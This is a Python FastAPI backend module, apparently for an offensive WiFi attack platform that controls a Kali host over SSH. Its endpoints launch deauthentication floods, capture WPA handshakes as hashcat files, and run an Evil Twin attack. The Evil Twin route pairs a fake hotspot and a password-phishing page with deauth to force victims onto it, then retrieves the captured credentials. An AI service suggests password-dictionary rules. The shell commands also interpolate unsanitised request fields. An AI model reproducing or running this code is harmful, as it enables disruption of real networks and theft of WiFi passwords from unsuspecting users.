from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


# ==========================================
# 1. 请求模型 (已扩展支持 Evil Twin 参数)
# ==========================================
class AttackRequest(BaseModel):
    bssid: str
    interface: str = "wlan0"  # 卡1：用于 Deauth / 抓手
    channel: str = "1"
    duration: int = 60

    # --- 以下为 Evil Twin 专用参数 ---
    ap_interface: str = "wlan1"  # 卡2：用于建立钓鱼热点
    ssid: str = "Free_WiFi"  # 钓鱼热点名称
    template_html: str = """<html><body><h1>WiFi Security Check</h1><form method='POST'><input name='password' type='password' placeholder='Enter WiFi Password'><button>Verify</button></form></body></html>"""


class AIAnalysisRequest(BaseModel):
    ssid: str
    encryption: str
    bssid: str


# ==========================================
# 2. 辅助工具：自动定位 Payload 脚本
# ==========================================
def find_payload_script(script_name: str):
    """在项目目录中自动查找 kali_payloads 脚本路径"""
    current_file = Path(__file__).resolve()
    # 向上遍历 5 层寻找 kali_payloads
    # 路径链: endpoints -> v1 -> api -> app -> backend -> [kali_payloads]
    search_paths = [
        current_file.parents[5] / "kali_payloads" / script_name,
        current_file.parents[4] / "kali_payloads" / script_name,
        Path.cwd() / "kali_payloads" / script_name,
        Path.cwd().parent / "kali_payloads" / script_name,
    ]
    for p in search_paths:
        if p.exists(): return str(p)
    return None


# ==========================================
# 3. 文件下载接口 (保留原功能)
# ==========================================
@router.get("/download/{filename}")
async def download_file(filename: str):
    """下载 captures 目录下的文件"""
    if ".." in filename or "/" in filename:
        raise HTTPException(400, "Invalid filename")

    file_path = Path.cwd() / "captures" / filename
    if not file_path.exists():
        # 尝试去 backend/captures 找
        file_path = Path(__file__).resolve().parents[4] / "captures" / filename

    if not file_path.exists():
        raise HTTPException(404, "File not found")

    return FileResponse(path=file_path, filename=filename, media_type='application/octet-stream')


# ==========================================
# 4. Deauth 洪水攻击 (保留原功能)
# ==========================================
@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    if not ssh_client.client:
        try:
            ssh_client.connect()
        except Exception as e:
            raise HTTPException(500, f"SSH连接失败: {str(e)}")

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path: raise HTTPException(500, f"缺失 {script_name}")

    try:
        remote_path = ssh_client.upload_payload(local_path, script_name)
        duration = int(req.duration)
        # 后台执行，不阻塞
        cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
        ssh_client.exec_command(cmd)
        return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
    except Exception as e:
        raise HTTPException(500, f"执行异常: {str(e)}")


# ==========================================
# 5. 握手包捕获接口 (保留原功能)
# ==========================================
@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    print(f"[*] 收到握手包捕获请求: {req.bssid}")
    if not ssh_client.client: ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path: raise HTTPException(500, f"本地找不到 {script_name}")

    remote_path = ssh_client.upload_payload(local_path, script_name)

    # 同步执行，等待结果
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"
    print(f"[*] Executing: {cmd}")

    try:
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        output = stdout.read().decode()
        print(f"[DEBUG] Kali Output:\n{output}")

        response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}

        # 确定本地保存目录
        local_dir = Path.cwd() / "captures"
        if not local_dir.exists(): local_dir.mkdir()

        # A. 检查并下载 .cap / .pcap 文件
        if "CAPTURED_HS_POTENTIAL" in output:
            # 文件名可能是 cap 也可能是 pcap
            cap_files = [f"/tmp/handshake_{req.bssid.replace(':', '')}-01.cap",
                         f"/tmp/handshake_{req.bssid.replace(':', '')}-01.pcap"]
            remote_cap = None
            for f in cap_files:
                _in, _out, _err = ssh_client.exec_command(f"ls {f}")
                if not _err.read():
                    remote_cap = f
                    break

            if remote_cap:
                ts = int(time.time())
                local_cap = f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"
                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
                    response_data["status"] = "success"
                    response_data["msg"] = "成功捕获握手包"
                    response_data["cap_file"] = local_cap

            # B. 检查并下载 .hc22000 文件 (Hashcat专用)
            if "Hash file generated" in output:
                remote_hash = f"/tmp/handshake_{req.bssid.replace(':', '')}.hc22000"
                local_hash = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"

                # 检查远程文件是否存在
                _in, _out, _err = ssh_client.exec_command(f"ls {remote_hash}")
                if not _err.read():
                    if ssh_client.download_file(remote_hash, str(local_dir / local_hash)):
                        response_data["hash_file"] = local_hash

        return response_data

    except Exception as e:
        return {"status": "error", "msg": str(e)}


# ==========================================
# 6. AI 分析 (保留原功能)
# ==========================================
@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    try:
        raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
        if isinstance(raw, dict) and "risk_level" in raw: return raw
        return {
            "risk_level": "中 (Medium)",
            "summary": "AI 服务暂未返回标准数据。",
            "advice": "目标使用 WPA/WPA2 加密。建议尝试捕获握手包。",
            "dict_rules": ["纯数字", "手机号段"]
        }
    except Exception as e:
        return {"risk_level": "Unknown", "summary": "Error", "advice": str(e), "dict_rules": []}


# ==========================================
# 7. 🔥 Evil Twin 双子攻击 (新增/完整实现)
# ==========================================
@router.post("/eviltwin/start")
async def start_evil_twin(req: AttackRequest):
    """
    启动双子攻击：
    1. 使用 req.interface 对目标 BSSID 进行 Deauth 攻击 (把人踢下线)
    2. 使用 req.ap_interface 启动 Fake AP + 钓鱼页面 (等人连上来)
    """
    # 1. 基础检查
    if req.interface == req.ap_interface:
        raise HTTPException(400, "错误：攻击网卡和 AP 网卡不能是同一个！请插入两张网卡。")

    if not ssh_client.client:
        ssh_client.connect()

    # 2. 上传脚本
    # 查找并上传 Evil Twin 脚本
    et_script = "eviltwin_worker.py"
    local_et = find_payload_script(et_script)
    if not local_et: raise HTTPException(500, f"找不到 {et_script}，请确认已创建该文件")
    remote_et = ssh_client.upload_payload(local_et, et_script)

    # 查找并上传 Deauth 脚本 (复用 attack_worker.py)
    deauth_script = "attack_worker.py"
    local_deauth = find_payload_script(deauth_script)
    if not local_deauth: raise HTTPException(500, f"找不到 {deauth_script}")
    remote_deauth = ssh_client.upload_payload(local_deauth, deauth_script)

    try:
        # 3. 准备钓鱼模板 (简单的 HTML 转义处理，防止命令注入)
        clean_html = req.template_html.replace('"', '\\"').replace('`', '\\`')

        # 4. 启动 Fake AP (后台运行)
        # 注意：这里我们通过命令行参数传递模板内容。如果模板很大，建议改为文件上传方式。
        print(f"[*] Starting Evil Twin on {req.ap_interface} with SSID: {req.ssid}")
        et_cmd = f"nohup python3 {remote_et} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --template \"{clean_html}\" > /tmp/eviltwin.log 2>&1 &"
        ssh_client.exec_command(et_cmd)

        # 5. 启动 Deauth 攻击 (后台运行)
        # 持续攻击目标 AP，迫使用户断线重连
        print(f"[*] Starting Deauth Flood on {req.interface} -> {req.bssid}")
        deauth_cmd = f"nohup python3 {remote_deauth} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration} > /tmp/et_deauth.log 2>&1 &"
        ssh_client.exec_command(deauth_cmd)

        return {
            "status": "started",
            "msg": "双子攻击已启动！请等待用户连接钓鱼热点。",
            "details": {
                "ap_interface": req.ap_interface,
                "deauth_interface": req.interface,
                "ssid": req.ssid,
                "logs": ["/tmp/eviltwin.log", "/tmp/et_deauth.log"]
            }
        }

    except Exception as e:
        raise HTTPException(500, f"启动失败: {str(e)}")


@router.post("/eviltwin/stop")
async def stop_evil_twin():
    """停止所有攻击并恢复网络"""
    if not ssh_client.client: ssh_client.connect()
    try:
        # 杀掉 Python 进程
        ssh_client.exec_command("pkill -f eviltwin_worker.py")
        ssh_client.exec_command("pkill -f attack_worker.py")

        # 杀掉工具进程 (Hostapd, Dnsmasq, Aireplay)
        ssh_client.exec_command("killall hostapd dnsmasq aireplay-ng")

        # 清理 iptables 转发规则
        ssh_client.exec_command("iptables --flush && iptables -t nat --flush")

        return {"status": "success", "msg": "Evil Twin 攻击已停止，环境已清理。"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}


@router.get("/eviltwin/credentials")
async def get_credentials():
    """获取钓鱼捕获到的密码"""
    if not ssh_client.client: ssh_client.connect()
    try:
        # 读取 Kali 上的凭证文件
        stdin, stdout, stderr = ssh_client.exec_command("cat /tmp/eviltwin/captured_creds.txt")
        data = stdout.read().decode()

        if not data:
            return {"status": "waiting", "data": []}

        # 解析每一行日志
        # 日志格式示例: [+] Credential: password=12345678&other=...
        creds = []
        for line in data.splitlines():
            if line.strip():
                creds.append(line.strip())

        return {"status": "success", "data": creds}
    except Exception:
        # 文件可能还不存在（没人中招）
        return {"status": "empty", "data": []}